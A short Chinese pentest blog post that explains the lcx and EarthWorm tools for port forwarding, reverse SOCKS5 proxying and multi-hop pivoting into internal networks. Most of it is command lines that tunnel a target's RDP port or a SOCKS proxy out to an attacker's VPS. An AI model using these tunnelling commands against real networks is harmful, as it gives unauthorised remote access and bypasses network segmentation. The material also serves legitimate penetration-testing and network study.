Title: ew端口转发与SOCKS v5代理
Category: Pentest
Date: 2017-8-12
slug: ew-socksv5

首先第一点: 端口转发和socks代理两个是不一样的东西。

根据<http://rootkiter.com/2015/04/28/LCX_SOCKS.html>里面提到的端口转发工具有三种工作状态:

* slave 客户端接客户端      -slave ConnectHost ConnectPort TransmitHost TransmitPort 
* tran  服务端接客户端      -tran  ConnectPort TransmitHost TransmitPort
* listen 服务端接服务端     -listen ConnectPort TransmitPort

再来个例子<https://xianzhi.aliyun.com/forum/read/735.html>

```
lcx.exe -slave 139.xx.xx.xx 9000 10.10.10.2 3389 //目标机器的所有数据转发到公网vps的9000端口
lcx.exe -listen 9000 5555   //将本机9000端口监听的数据转发到本机5555端口
通过上门两个端口转发，可以登陆vps上面的5555端口，或者vps上面127.0.0.1的的5555端口
```

上面两个对应的ew是这么写的：

```
ew.exe -s lcx_slave -d 45.xx.xx.xx -e 9000 -f 127.0.0.1 -g 3389
./ew_for_linux64 -s lcx_listen -l 5555 -e 9000

第一个靶机可以抓发vps访问不到的ip，比如linux的22端口，也就是把这个机子作为跳板。 

```

代理: 

* 如果目标有公网IP:

`ew.exe -s ssocksd -l 1080`  即可将其作为代理

* 如果没有公网IP，但是可以访问公网

```
首先在公网IP运行:

ew -s rcsocks -l 1080 -e 8888

然后在目标主机运行反弹:

ew -s rssocks -d 45.x.x.x.x -e 8888

然后就可以以公网的1080作为代理进入内网
```

以上是最简单最基本的应用,二级和三级的链接可以看下面的文章：
<https://xianzhi.aliyun.com/forum/read/735.html>

其实上面的文章简单总结下就是ew官网写的那几条命令

## 二级级联

```
ew -s ssocksd -l 9999    //在B上面开一个9999的socks代理
ew -s lcx_tran -l 1080 -f x.x.x.x -g 9999 //在具有公网IP的主机上连接B开了代理的机子
```

如果x.x.x.x没有公网IP，但是可以连通公网IP，就需要以下的步骤

```
ew -s lcx_listen -l 1080 -e 8888 //vps运行，把1080接受到的数据发送给8888
ew -s ssocksd -l 9999 //可以接触核心网络的C主机上面开一个9999端口的代理
接下来就是中间的B主机连接vps和C主机

ew -s lcx_slave -d VPS的IP -e 8888 -f C的IP -g 9999

至此，隧道打通
```

最后来一个复杂的三级网络:
先说下最简单的反代，前面说过:

```
首先在公网IP运行:

ew -s rcsocks -l 1080 -e 8888

然后在目标主机运行反弹:

ew -s rssocks -d 45.x.x.x.x -e 8888

然后就可以以公网的1080作为代理进入内网
```

复杂的三级就是在这两个主机之间加了两个主机

```
ew -s rcsocks -l 1080 -e 8888 //把1080端口收到的请求转给8888端口

ew -s lcx_slave -d 43.x.x.x -e 8888 -f 10.x.x.x -g 9999
ew -s lcx_listen -l 9999 -e 7777

ew -s rssocks -d 11.x.x.x 7777

```






